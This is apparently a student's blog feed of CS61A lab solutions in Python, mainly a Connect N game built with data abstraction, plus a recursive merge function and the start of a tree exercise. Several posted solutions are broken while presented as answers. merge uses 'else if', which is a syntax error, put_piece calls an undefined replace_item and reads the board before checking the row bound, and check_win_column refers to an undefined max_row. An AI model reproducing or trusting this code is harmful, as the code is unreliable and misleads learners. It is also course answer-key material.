<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(lst1, lst2)</span>:</span></span><br><span class="line">    <span class="string">"""Merges two sorted lists.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([1, 3, 5], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [2, 4, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([1, 2, 3], [])</span></span><br><span class="line"><span class="string">    [1, 2, 3]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([5, 7], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [2, 4, 5, 6, 7]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lst1:</span><br><span class="line">        <span class="keyword">return</span> lst2</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> lst2:</span><br><span class="line">        <span class="keyword">return</span> lst1</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> lst1[<span class="number">0</span>] &lt; lst2[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">return</span> [lst1[<span class="number">0</span>]] + merge(lst1[<span class="number">1</span>:], lst2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [lst2[<span class="number">0</span>]] + merge(lst2[<span class="number">1</span>:], lst1)</span><br></pre></td></tr></table></figure>

<h1 id="Connect-N"><a href="#Connect-N" class="headerlink" title="Connect N"></a>Connect N</h1><p>You’ve probably heard of Connect 4, a two-player game where the players take turns dropping a colored piece from the top of a column in a grid. The piece ends at the last empty spot in this column - that is, as close to the bottom as possible. A player can only put pieces in columns with open spaces.</p>


<p>The winner is the first player who gets N of their pieces next to each other - either horizontally, vertically or diagonally. The game ends at this point, or as soon as the board is full.</p>
<p>We can generalize this game so that the goal is to connect N pieces instead of just 4. In this section, we will be implementing a command line version of Connect N!</p>
<h2 id="Building-Connect-N"><a href="#Building-Connect-N" class="headerlink" title="Building Connect N"></a>Building Connect N</h2><p>Let’s build the combat field for players ‘X’ and ‘O’.</p>
<p>In this lab, we will represent the playing board as a list of lists. We call such a list two-dimensional because we can visualize it as a rectangle. For instance, this list:</p>
<p><code>[[&#39;-&#39;, &#39;-&#39;, &#39;-&#39;, &#39;-&#39;], [&#39;O&#39;, &#39;O&#39;, &#39;O&#39;, &#39;X&#39;], [&#39;X&#39;, &#39;X&#39;, &#39;X&#39;, &#39;O&#39;]]</code><br>would represent the following board:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- - - -</span><br><span class="line">O O O X</span><br><span class="line">X X X O</span><br></pre></td></tr></table></figure>
<p>What does the number of nested lists represent? What about the number of elements in each nested list? When you have made up your mind, you are ready to build the board!</p>
<p><strong>Notice that just like lists are zero-indexed, our board is zero-indexed.</strong> This means that the columns and rows in the above board would be numbered like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0  - - - -</span><br><span class="line">1  O O O X</span><br><span class="line">2  X X X O</span><br><span class="line">   0 1 2 3</span><br></pre></td></tr></table></figure>
<h2 id="Q9-Creating-an-empty-board"><a href="#Q9-Creating-an-empty-board" class="headerlink" title="Q9: Creating an empty board"></a>Q9: Creating an empty board</h2><p>We are going to use data abstraction as we build our game, so let’s start by making the constructors. We will represent an empty spot by the string <code>&#39;-&#39;</code>. In <code>lab04_extra.py</code>, fill out the constructors.</p>
<p>First, implement the function <code>create_row</code>, which returns one empty row in our board according to our abstraction (i.e., a row is one list).</p>
<p>This function should consist of a one-line return statement.</p>
<p><em>Hint: You can create a list in one line using a list comprehension.</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_row</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a single, empty row with the given size. Each empty spot is represented by the string '-'.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; create_row(5)</span></span><br><span class="line"><span class="string">    ['-', '-', '-', '-', '-']</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'-'</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(size)]</span><br></pre></td></tr></table></figure>
<p>Then, use <code>create_row</code> to implement <code>create_board</code>, which returns a board with the specified dimensions.</p>
<p>This function should consist of a one-line return statement.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_board</span><span class="params">(rows, columns)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a board with the given dimensions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; create_board(3, 5)</span></span><br><span class="line"><span class="string">    [['-', '-', '-', '-', '-'], ['-', '-', '-', '-', '-'], ['-', '-', '-', '-', '-']]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> [create_row(columns) <span class="keyword">for</span> x <span class="keyword">in</span> range(rows)]</span><br></pre></td></tr></table></figure>
<h2 id="Q10-Updating-the-board"><a href="#Q10-Updating-the-board" class="headerlink" title="Q10: Updating the board"></a>Q10: Updating the board</h2><p>Over the course of a game, the board will change and we will need to keep our representation of the board up-to-date. To do so, we will be creating a new board that represents the new state of the game every time a piece is played. Implement <code>replace_elem</code>, which takes a list, an index, and an element to be placed at that index in the returned new list.</p>
<p>This function should consist of a one-line return statement.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace_elem</span><span class="params">(lst, index, elem)</span>:</span></span><br><span class="line">    <span class="string">"""Create and return a new list whose elements are the same as those in LST except at index INDEX, which should contain element ELEM instead.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; old = [1, 2, 3, 4, 5, 6, 7]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new = replace_elem(old, 2, 8)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new</span></span><br><span class="line"><span class="string">    [1, 2, 8, 4, 5, 6, 7]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new is old   # check that replace_elem outputs a new list</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> index &gt;= <span class="number">0</span> <span class="keyword">and</span> index &lt; len(lst), <span class="string">'Index is out of bounds'</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> [lst[i] <span class="keyword">if</span> i != index <span class="keyword">else</span> elem <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lst))]</span><br><span class="line">    <span class="comment">#  return lst[:index] + [elem] + lst[(index + 1):]</span></span><br></pre></td></tr></table></figure>

<h2 id="Q11-Manipulating-pieces"><a href="#Q11-Manipulating-pieces" class="headerlink" title="Q11: Manipulating pieces"></a>Q11: Manipulating pieces</h2><p>Now that we have the board ready, let’s make our selectors! First, we need a way to find out which piece (<code>&#39;-&#39;</code>, <code>&#39;X&#39;</code> or <code>&#39;O&#39;</code>) is at a given position. Implement <code>get_piece</code> so it does this.</p>
<p>Note: Because get_piece is a selector, it is allowed to break through the data abstraction barrier. This means that it is aware that the board is implemented as a list and can use list operations to update it. This allows us to abstract away the inner implementation for all of the other functions that both the programmer and other users will use.</p>
<p>This function should consist of a one-line return statement.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_piece</span><span class="params">(board, row, column)</span>:</span></span><br><span class="line">    <span class="string">"""Returns the piece at location (row, column) in the board.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns = 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = put_piece(board, rows, 0, 'X')[1] # Puts piece "X" in column 0 of board and updates board</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = put_piece(board, rows, 0, 'O')[1] # Puts piece "O" in column 0 of board and updates board</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; get_piece(board, 1, 0)</span></span><br><span class="line"><span class="string">    'X'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; get_piece(board, 1, 1)</span></span><br><span class="line"><span class="string">    '-'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> board[row][column]</span><br></pre></td></tr></table></figure>
<p>Right now, all spots in our board are empty, so the output of <code>get_piece</code> won’t be very interesting - and neither will the game. Let’s change that! Go ahead and implement <code>put_piece</code>, which places the given <code>player</code>‘s piece in the given <code>column</code>. <code>put_piece</code> should return a 2-element tuple that contains (<code>&lt;row index&gt;</code>, <code>&lt;new board&gt;</code>). The first element is the index of the row the piece ends up in, or -1 if the column is already full. The second element is the new board after the piece has been placed. If the column was full then just return the original board.</p>
<p>Assume that the given column is on the board. Remember that you can get pieces in the board by using get_piece. The argument max_rows may be helpful in determining which rows you should check for an empty slot to put the piece in.</p>
<p>Hint: You will probably need to use the <code>replace_elem</code> function you wrote above twice to create the new board.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_piece</span><span class="params">(board, max_rows, column, player)</span>:</span></span><br><span class="line">    <span class="string">"""Puts PLAYER's piece in the bottommost empty spot in the given column of the board. Returns a tuple of two elements:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        1. The index of the row the piece ends up in, or -1 if the column is full.</span></span><br><span class="line"><span class="string">        2. The new board</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns = 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, new_board = put_piece(board, rows, 0, 'X')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, new_board = put_piece(new_board, rows, 0, 'O')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, new_board = put_piece(new_board, rows, 0, 'X')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    -1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    curr_row = max_rows - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> get_piece(board, curr_row, column) != <span class="string">'-'</span> <span class="keyword">and</span> curr_row &gt;= <span class="number">0</span>:</span><br><span class="line">        curr_row -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> curr_row &gt;= <span class="number">0</span>:</span><br><span class="line">        new_row = replace_item(board[curr_row], column, player)</span><br><span class="line">        new_board = replace_item(board, curr_row, new_row)</span><br><span class="line">        board = new_board</span><br><span class="line">    <span class="keyword">return</span> curr_row, board</span><br></pre></td></tr></table></figure>

<h1 id="You-are-now-crossing-the-abstraction-barrier"><a href="#You-are-now-crossing-the-abstraction-barrier" class="headerlink" title="You are now crossing the abstraction barrier!!!"></a>You are now crossing the abstraction barrier!!!</h1><p>You have now implemented the constructor and selectors as well as ways to modify the attributes of your abstract data type, the board. From now on, you should never need to treat the board as if it were a list. Instead, trust your abstraction barrier and use the functions you have written so far.</p>
<h2 id="Q12-Making-a-move"><a href="#Q12-Making-a-move" class="headerlink" title="Q12: Making a move"></a>Q12: Making a move</h2><p>Let’s first write a function for players to make a move in the game. This is different from the <code>put_piece</code> function above in that <code>put_piece</code> assumes that the player gives a valid column number. <code>make_move</code> should only place the piece on the board if the given column is actually on the board. It returns a 2-element tuple (row index, board).</p>
<p>If the move is valid, put a piece in the column and return the index of the row the piece ends up in (do you have a function that will help you do this?) as well as the new board. If the move is invalid, <code>make_move</code> should return -1 and the original board, unchanged.</p>
<p>The arguments <code>max_rows</code> and <code>max_cols</code> describe the dimensions of the board and may be useful in determining whether or not a move is valid.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_move</span><span class="params">(board, max_rows, max_cols, col, player)</span>:</span></span><br><span class="line">    <span class="string">"""Put player's piece in column COL of the board, if it is a valid move.</span></span><br><span class="line"><span class="string">    Return a tuple of two values:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        1. If the move is valid, make_move returns the index of the row the piece is placed in. Otherwise, it returns -1.</span></span><br><span class="line"><span class="string">        2. The updated board</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns = 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, board = make_move(board, rows, columns, 0, 'X')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; get_piece(board, 1, 0)</span></span><br><span class="line"><span class="string">    'X'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, board = make_move(board, rows, columns, 0, 'O')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, board = make_move(board, rows, columns, 0, 'X')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    -1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row, board = make_move(board, rows, columns, -4, '0')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; row</span></span><br><span class="line"><span class="string">    -1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> col &gt;= max_cols <span class="keyword">or</span> col &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, board</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> put_piece(board, max_rows, col, player)</span><br></pre></td></tr></table></figure>
<h2 id="Q13-Printing-and-viewing-the-board"><a href="#Q13-Printing-and-viewing-the-board" class="headerlink" title="Q13: Printing and viewing the board"></a>Q13: Printing and viewing the board</h2><p>Wouldn’t it be great if we could actually see the board and the pieces on it? Let’s now write a function to help us do that.</p>
<p>The function print_board takes in a board (as defined by our abstraction) and the dimensions of the board, and it prints out the current state of the board.</p>
<p>We would like our board to look good, and for this, strings do a better job than lists. Thus, we would like the row [‘X’, ‘X’, ‘O’, ‘-‘] to be printed as ‘X X O -‘ where the pieces are separated by a single blank space. Remember that you can concatenate strings with the + operator, e.g. ‘hel’ + ‘lo’ = ‘hello’.</p>
<p>Remember that we’re still on the other side of the abstraction barrier, and you must implement this function as if we didn’t know the board is a list of lists. This is called respecting the data abstraction barrier. Specifically, to get information about board, you should use the selectors you’ve implemented instead of indexing into it.</p>
<p><em>Hint: You might find that you’re failing doctests that seem to match your output. Chances are that you have an extra space character at the end of your rows in your board. A function that might come in handy is strip(), which removes leading and trailing whitespace from a string. For example:</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s &#x3D; &#39;   hello &#39;</span><br><span class="line">&gt;&gt;&gt; s.strip()</span><br><span class="line">&#39;hello&#39;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">My solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_board</span><span class="params">(board, max_rows, max_cols)</span>:</span></span><br><span class="line">    <span class="string">"""Prints the board. Row 0 is at the top, and column 0 at the far left.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns = 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_board(board, rows, columns)</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new_board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_board(new_board, rows, columns)</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    X -</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> row &lt; max_rows:</span><br><span class="line">        col = <span class="number">0</span></span><br><span class="line">        row_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> col &lt; max_cols:</span><br><span class="line">            row_str += get_piece(board, row, col) + <span class="string">' '</span></span><br><span class="line">            col += <span class="number">1</span></span><br><span class="line">        row_str = row_str.strip()</span><br><span class="line">        print(row_str)</span><br><span class="line">        row += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><span style="color:red">PDF solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_board</span><span class="params">(board, max_rows, max_cols)</span>:</span></span><br><span class="line">    <span class="string">"""Prints the board. Row 0 is at the top, and column 0 at the far left.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns = 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_board(board, rows, columns)</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new_board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_board(new_board, rows, columns)</span></span><br><span class="line"><span class="string">    - -</span></span><br><span class="line"><span class="string">    X -</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(max_rows):</span><br><span class="line">        row_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> range(max_cols):</span><br><span class="line">            piece = get_piece(board, row, col)</span><br><span class="line">            row_str += piece + <span class="string">" "</span></span><br><span class="line">        print(row_str.strip())</span><br></pre></td></tr></table></figure>

<h2 id="Q14-Checking-for-victory"><a href="#Q14-Checking-for-victory" class="headerlink" title="Q14: Checking for victory"></a>Q14: Checking for victory</h2><p>Fun, right? At long as you don’t care about winning… The last thing we need for our Connect N game to be fully functioning is the ability to detect a win.</p>
<p>First, let’s implement two helper functions <code>check_win_row</code> and <code>check_win_col</code> that check for horizontal and vertical wins for the given player.</p>
<p>Since we check for wins after each turn, and only the player who made the most recent move can have a win, <code>check_win_row</code> and <code>check_win_col</code> should only check for a win for the player that is passed as an argument. Also remember that <code>num_connect</code> tells you how many adjacent pieces are needed for a win. The arguments <code>max_rows</code> and <code>max_cols</code> describe the dimensions of the game board.</p>
<p>As in <code>print_board</code>, use the data abstractions you just built.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_win_row</span><span class="params">(board, max_rows, max_cols, num_connect, row, player)</span>:</span></span><br><span class="line">    <span class="string">""" Returns True if the given player has a horizontal win</span></span><br><span class="line"><span class="string">    in the given row, and otherwise False.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns, num_connect = 4, 4, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_row(board, rows, columns, num_connect, 3, 'O')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 2, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_row(board, rows, columns, num_connect, 3, 'X')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_row(board, rows, columns, num_connect, 3, 'X')</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_row(board, rows, columns, 4, 3, 'X')    # A win depends on the value of num_connect</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_row(board, rows, columns, num_connect, 3, 'O')   # We only detect wins for the given player</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> range(max_cols):</span><br><span class="line">        <span class="keyword">if</span> get_piece(board, row, col) == player:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count &gt;= num_connect:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_win_column</span><span class="params">(board, max_rows, max_cols, num_connect, col, player)</span>:</span></span><br><span class="line">    <span class="string">""" Returns True if the given player has a vertical win in the given column,</span></span><br><span class="line"><span class="string">    and otherwise False.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns, num_connect = 5, 5, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_column(board, rows, columns, num_connect, 0, 'X')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_column(board, rows, columns, num_connect, 1, 'O')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 2, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_column(board, rows, columns, num_connect, 1, 'O')</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_column(board, rows, columns, 4, 1, 'O')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win_column(board, rows, columns, num_connect, 1, 'X')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(max_row):</span><br><span class="line">        <span class="keyword">if</span> get_piece(board, row, col) == player:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count &gt;= num_connect:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h2 id="Q15-Winning"><a href="#Q15-Winning" class="headerlink" title="Q15: Winning!"></a>Q15: Winning!</h2><p>Finally, let’s implement a way to check for any wins. Implement <code>check_win</code> so that it returns <code>True</code> if there is a win in any direction - that is, horizontally, vertically or diagonally.</p>
<p>You should use the functions you just wrote, <code>check_win_row</code> and <code>check_win_column</code>, along with the provided function <code>check_win_diagonal(board, max_rows, max_cols, num_connect, row, col, player)</code>, which returns <code>True</code> if the given player has a diagonal win passing the spot (row, column) and <code>False</code> otherwise.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_win</span><span class="params">(board, max_rows, max_cols, num_connect, row, col, player)</span>:</span></span><br><span class="line">    <span class="string">"""Returns True if the given player has any kind of win passing through</span></span><br><span class="line"><span class="string">    (row, col), and False otherwise.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rows, columns, num_connect = 2, 2, 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 0, 0, 'O')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 0, 0, 'X')</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 1, 0, 'X')</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 0, 0, 'X')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = create_board(rows, columns)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 0, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'O')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; board = make_move(board, rows, columns, 1, 'X')[1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 0, 0, 'X')</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check_win(board, rows, columns, num_connect, 1, 0, 'X')</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    diagonal_win = check_win_diagonal(board, max_rows, max_cols, num_connect, row, col, player)</span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> check_win_row(board, max_rows, max_cols, num_connect, row, player) <span class="keyword">or</span> check_win_column(board, max_rows, max_cols, num_connect, col, player) <span class="keyword">or</span> diagonal_win</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab05</title>
    <url>/2018/10/08/cs61a-lab05/</url>
    <content><![CDATA[<h2 id="Q1-Acorn-Finder"><a href="#Q1-Acorn-Finder" class="headerlink" title="Q1: Acorn Finder"></a>Q1: Acorn Finder</h2><p>The squirrels on campus need your help! There are a lot of trees on campus and the squirrels would like to know which ones contain acorns. Define the function acorn_finder, which takes in a tree and returns True if the tree contains a node with the value ‘acorn’ and False otherwise.</p>
<a id="more"></a>
